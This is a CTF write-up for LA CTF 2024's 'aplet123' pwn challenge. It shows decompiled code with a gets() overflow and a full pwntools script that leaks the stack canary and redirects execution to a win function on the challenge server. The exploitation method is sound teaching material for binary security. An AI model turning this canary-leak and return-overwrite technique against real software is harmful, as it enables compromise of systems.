---
title: aplet123
date:  2024-02-25T20:00:00+02:00
description: Writeup for aplet123 [LA CTF 2024]
type: writeup
author: PineBel
tags:
- pwn
draft: false
---

## Challenge Description:

bliutech: Can we get ApletGPT?
me: No we have ApletGPT at home.
ApletGPT at home:

## Intuition 

We are given an ELF 64-bit binary with the following protections:
```bash 

$ checksec --file=aplet123
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols        No    0               3               aplet123

```

We can see that it has canary and No PIE, after opening it in Ghidra we can see that we have three options from which we can choose, the only one that actually leaks something is the first option which can be entered if our input has 'i'm' in it. In Ghidra we can also see a print_flag function, so this seems like a ret2win where we first need to leak the canary and then call the print_flag function.



```C
undefined8 main(void)

{
  int iVar1;
  time_t tVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  puts("hello");
  while( true ) {
    while( true ) {
      while( true ) {
        gets(local_58);
        pcVar3 = strstr(local_58,"i\'m");
        if (pcVar3 == (char *)0x0) break;
        printf("hi %s, i\'m aplet123\n",pcVar3 + 4);
      }
      iVar1 = strcmp(local_58,"please give me the flag");
      if (iVar1 != 0) break;
      puts("i\'ll consider it");
      sleep(5);
      puts("no");
    }
    iVar1 = strcmp(local_58,"bye");
    if (iVar1 == 0) break;
    iVar1 = rand();
    puts(*(char **)(responses + ((ulong)(long)iVar1 % 0x21) * 8));
  }
  puts("bye");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```
The exploit for this challenge is to first leak the canary with the first option and then call the print_flag function. I also leaked the addresses of the print_flag function even though this wasn't necessary because it had No PIE.

### Solution

The solution is pretty straightforward, it's a ret2win with the need to leak the canary. 

```py
from pwn import *

gdbscript = """
b *main
c
"""

#target = gdb.debug("./aplet123",gdbscript=gdbscript)
#target = process("./aplet123")
target = remote("chall.lac.tf",31123)
# this is extra
main_offset = 0x401261
print_flag_offset = 0x4011e6
function_offset = main_offset - print_flag_offset

# ============================= Canary Leak =============================

padding = 69*"A" + "i'm"
#we want to leak the main address so first I'll leak the canary so we can read after the canary what mains address is
target.sendlineafter(b"hello",padding.encode())
target.recvline()
canary = target.recvline()

leaked_canary = ''
for i in range(3,10):
    if (chr(canary[i])!= ','):
        leaked_canary += canary[i].to_bytes().hex()   
    else:
        break 

# format the address
leaked_canary = "".join(reversed([leaked_canary[i:i+2] for i in range(0,len(leaked_canary),2)]))
print(hex(int(leaked_canary,16)))

# ============================= Canary Leak =============================

# No need to leak the main if we have NO pie, I still did it 
# ============================= Main Leak =============================

padding = 100*"A" + "i'm"
target.sendline(padding.encode())
main = target.recvline()

leaked_main = ''
for i in range(3,10):
    if (chr(main[i])!= ','):
        leaked_main += main[i].to_bytes().hex()   
    else:
        break 

# format the address
leaked_main = "".join(reversed([leaked_main[i:i+2] for i in range(0,len(leaked_main),2)]))
print(hex(int(leaked_main,16)))

# ============================= Main Leak =============================

main_address = int(leaked_main,16)
print(main_address,function_offset)
print_flag_address = main_address - function_offset
print(hex(print_flag_address))

# ============================= Create Payload =============================

leaked_canary += "00"
payload = 9*8*b"A" + p64(int(leaked_canary,16)) + 8*b"B" + p64(print_flag_address)
target.sendline(payload)

# gdb.attach(target)
# pause()

target.sendline(b"bye")

# ============================= Create Payload =============================

target.interactive()
```